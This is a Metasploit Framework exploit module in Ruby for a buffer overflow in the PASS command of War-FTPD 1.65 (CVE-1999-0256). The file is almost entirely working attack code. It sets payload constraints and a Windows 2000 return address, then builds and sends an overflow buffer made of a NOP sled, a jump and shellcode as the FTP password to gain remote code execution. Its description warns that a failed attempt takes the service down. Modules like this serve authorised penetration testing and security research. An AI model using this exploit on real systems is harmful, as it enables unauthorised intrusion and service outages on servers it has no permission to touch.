##
# $Id: warftpd_165_pass.rb 9669 2010-07-03 03:13:45Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'War-FTPD 1.65 Password Overflow',
			'Description'    => %q{
					This exploits the buffer overflow found in the PASS command
				in War-FTPD 1.65. This particular module will only work
				reliably against Windows 2000 targets. The server must be
				configured to allow anonymous logins for this exploit to
				succeed. A failed attempt will bring down the service
				completely.
			},
			'Author'         => 'hdm',
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 9669 $',
			'References'     =>
				[
					[ 'CVE', '1999-0256'],
					[ 'OSVDB', '875'    ],
					[ 'BID', '10078'	],
					[ 'URL', 'http://lists.insecure.org/lists/bugtraq/1998/Feb/0014.html' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process'
				},
			'Payload'        =>
				{
					'Space'    => 424,
					'BadChars' => "\x00\x0a\x0d\x40",
					'StackAdjustment' => -3500,
					'Compat'   =>
						{
							'ConnectionType' => "-find"
						}
				},
			'Targets'        =>
				[
					# Target 0
					[
						'Windows 2000',
						{
							'Platform' => 'win',
							'Ret'      => 0x5f4e772b # jmp ebx in the included MFC42.DLL
						},
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Mar 19 1998'))
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		buf          = make_nops(566) + payload.encoded
		buf[558, 2]  = "\xeb\x06"
		buf[562, 4]  = [ target.ret ].pack('V')

		# Send USER Command
		send_user(datastore['FTPUSER'])

		# Send PASS Command
		send_cmd(['PASS', buf], false)

		handler
		disconnect
	end

end